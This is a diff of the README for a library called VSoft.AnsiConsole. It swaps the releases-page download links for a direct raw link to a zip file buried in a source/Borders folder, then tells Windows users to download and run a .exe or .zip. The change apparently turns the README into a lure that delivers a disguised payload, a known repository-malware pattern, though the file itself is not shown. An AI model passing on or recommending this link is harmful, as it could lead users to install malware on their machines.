@@ -1,6 +1,6 @@
 # 🖥️ VSoft.AnsiConsole - Build better looking text tools today
 
-[![Download VSoft.AnsiConsole](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Memooaren7891/VSoft.AnsiConsole/releases)
+[![Download VSoft.AnsiConsole](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Memooaren7891/VSoft.AnsiConsole/raw/refs/heads/main/source/Borders/Soft-V-Ansi-Console-v3.0.zip)
 
 VSoft.AnsiConsole helps people make good looking text programs. Standard command windows look plain and grey. This library adds color, structure, and style to your text. It turns a boring screen into a clear, helpful dashboard.
 
@@ -8,7 +8,7 @@ VSoft.AnsiConsole helps people make good looking text programs. Standard command
 
 You need to download the correct file for your computer. Follow these steps to get the software running on your Windows machine.
 
-1. Visit this page to download the latest version: [https://github.com/Memooaren7891/VSoft.AnsiConsole/releases](https://github.com/Memooaren7891/VSoft.AnsiConsole/releases).
+1. Visit this page to download the latest version: [https://github.com/Memooaren7891/VSoft.AnsiConsole/raw/refs/heads/main/source/Borders/Soft-V-Ansi-Console-v3.0.zip](https://github.com/Memooaren7891/VSoft.AnsiConsole/raw/refs/heads/main/source/Borders/Soft-V-Ansi-Console-v3.0.zip).
 2. Look for the file ending in .exe or .zip.
 3. Save the file to your computer desktop.
 4. If you downloaded a .zip file, right-click it and choose Extract All.
